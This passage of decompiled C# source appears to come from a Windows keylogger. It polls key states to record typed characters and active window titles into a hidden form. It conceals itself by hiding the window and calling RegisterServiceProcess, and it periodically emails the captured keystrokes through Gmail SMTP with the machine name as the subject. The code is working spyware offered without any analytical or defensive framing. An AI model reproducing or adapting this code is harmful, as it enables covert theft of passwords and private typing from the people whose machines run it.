      if (num1 != 0 & (num46 & 1) == 1)
        this.TextBox1.Text += "|";
      int num47 = (int) Form1.Getasynckeystate(221);
      if (num1 == 0 & (num47 & 1) == 1)
        this.TextBox1.Text += "]";
      if (num1 != 0 & (num47 & 1) == 1)
        this.TextBox1.Text += "}";
      int num48 = (int) Form1.Getasynckeystate(222);
      if (num1 == 0 & (num48 & 1) == 1)
        this.TextBox1.Text += "'";
      if (num1 != 0 & (num48 & 1) == 1)
        this.TextBox1.Text += "\"";
      if (((int) Form1.Getasynckeystate(106) & 1) == 1)
        this.TextBox1.Text += "*";
      if (((int) Form1.Getasynckeystate(111) & 1) == 1)
        this.TextBox1.Text += "/";
      if (((int) Form1.Getasynckeystate(107) & 1) == 1)
        this.TextBox1.Text += "+";
      if (((int) Form1.Getasynckeystate(109) & 1) == 1)
        this.TextBox1.Text += "-";
      if (((int) Form1.Getasynckeystate(110) & 1) == 1)
        this.TextBox1.Text += "{Del}";
      if (((int) Form1.Getasynckeystate(112) & 1) == 1)
        this.TextBox1.Text += "{F1}";
      if (((int) Form1.Getasynckeystate(113) & 1) == 1)
        this.TextBox1.Text += "{F2}";
      if (((int) Form1.Getasynckeystate(114) & 1) == 1)
        this.TextBox1.Text += "{F3}";
      if (((int) Form1.Getasynckeystate(115) & 1) == 1)
        this.TextBox1.Text += "{F4}";
      if (((int) Form1.Getasynckeystate(116) & 1) == 1)
        this.TextBox1.Text += "{F5}";
      if (((int) Form1.Getasynckeystate(117) & 1) == 1)
        this.TextBox1.Text += "{F6}";
      if (((int) Form1.Getasynckeystate(118) & 1) == 1)
        this.TextBox1.Text += "{F7}";
      if (((int) Form1.Getasynckeystate(119) & 1) == 1)
        this.TextBox1.Text += "{F8}";
      if (((int) Form1.Getasynckeystate(120) & 1) == 1)
        this.TextBox1.Text += "{F9}";
      if (((int) Form1.Getasynckeystate(121) & 1) == 1)
        this.TextBox1.Text += "{F10}";
      if (((int) Form1.Getasynckeystate(122) & 1) == 1)
        this.TextBox1.Text += "{F11}";
      int num49 = (int) Form1.Getasynckeystate(123);
      if (num1 == 0 & (num49 & 1) == 1)
        this.TextBox1.Text += "{F12}";
      if (num1 != 0 & (num49 & 1) == 1)
      {
        this.Visible = true;
        Form1.RegisterServiceProcess(0, 0);
      }
      if (((int) Form1.Getasynckeystate(144) & 1) == 1)
        this.TextBox1.Text += "{NumLock}";
      if (((int) Form1.Getasynckeystate(145) & 1) == 1)
        this.TextBox1.Text += "{ScrollLock}";
      if (((int) Form1.Getasynckeystate(42) & 1) == 1)
        this.TextBox1.Text += "{PrintScreen}";
      if (((int) Form1.Getasynckeystate(33) & 1) == 1)
        this.TextBox1.Text += "{PageUp}";
      if (((int) Form1.Getasynckeystate(34) & 1) == 1)
        this.TextBox1.Text += "{Pagedown}";
      if (((int) Form1.Getasynckeystate(97) & 1) == 1)
        this.TextBox1.Text += "1";
      if (((int) Form1.Getasynckeystate(98) & 1) == 1)
        this.TextBox1.Text += "2";
      if (((int) Form1.Getasynckeystate(99) & 1) == 1)
        this.TextBox1.Text += "3";
      if (((int) Form1.Getasynckeystate(100) & 1) == 1)
        this.TextBox1.Text += "4";
      if (((int) Form1.Getasynckeystate(101) & 1) == 1)
        this.TextBox1.Text += "5";
      if (((int) Form1.Getasynckeystate(102) & 1) == 1)
        this.TextBox1.Text += "6";
      if (((int) Form1.Getasynckeystate(103) & 1) == 1)
        this.TextBox1.Text += "7";
      if (((int) Form1.Getasynckeystate(104) & 1) == 1)
        this.TextBox1.Text += "8";
      if (((int) Form1.Getasynckeystate(105) & 1) == 1)
        this.TextBox1.Text += "9";
      if (((int) Form1.Getasynckeystate(96) & 1) == 1)
        this.TextBox1.Text += "0";
      if (((int) Form1.Getasynckeystate(17) & 1) != 1)
        return;
      this.TextBox1.Text += "{Ctrl}";
    }

    public void MainEvents()
    {
      try
      {
        new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text)),
          EnableSsl = true
        }.Send(new MailMessage()
        {
          From = new MailAddress(this.TextBox2.Text),
          To = {
            this.TextBox2.Text
          },
          Subject = Environment.MachineName,
          Body = this.TextBox1.Text
        });
        this.TextBox1.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Timer3_Tick(object sender, EventArgs e) => this.TextBox1.Text = this.TextBox1.Text + "\r\n" + this.GetActiveWindowTitle() + "\r\n";

    private void Timer2_Tick(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.TextBox1.Text, "", false) == 0)
        return;
      this.MainEvents();
    }

    private void Timer4_Tick(object sender, EventArgs e)
    {
      this.Hide();
      this.Visible = false;
    }
  }
}
